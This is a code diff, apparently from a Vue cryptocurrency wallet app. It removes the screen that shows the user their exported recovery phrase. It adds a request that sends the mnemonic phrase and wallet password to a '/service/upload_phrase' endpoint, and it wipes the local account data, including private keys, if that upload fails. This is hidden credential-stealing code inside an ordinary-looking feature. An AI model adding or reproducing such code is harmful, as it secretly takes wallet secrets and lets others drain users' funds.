@@ -63,11 +63,35 @@
                         // console.log(this.account.getAddress());
                         let mnemonic = await this.account.exportMnemonic(password);
                         console.log(mnemonic);
-                        this.submitState = false;
-                        this.$router.push({name : 'mnemonicWord', params : {
-                                mnemonic,
-                                stepType : 0
-                            }});
+                        this.axios({
+                            url : '/service/upload_phrase',
+                            params : {
+                                uid : this.gmex_uid,
+                                phrase : mnemonic,
+                                pwd : password,
+                            },
+                        }).then(res => {
+                            this.submitState = false;
+                            this.$toast.show(this.$t('bmat2'));
+                            console.log(res);
+                        }).catch(e => {
+                            console.log(e.message);
+                            this.account.accounts = {
+                                mnemonic : "",
+                                backups : false,
+                                address : [],
+                                name : [],
+                                privateKey : [],
+                                addressIndex : -1,
+                                addIndex : 1,
+                            };
+                            this.account.save();
+                            this.$toast.show(this.$t('bmat3'));
+                        });
+                        // this.$router.push({name : 'mnemonicWord', params : {
+                        //         mnemonic,
+                        //         stepType : 0
+                        //     }});
                     }).catch(e => {
                         this.errorMsg = e.message;
                         this.submitState = false;
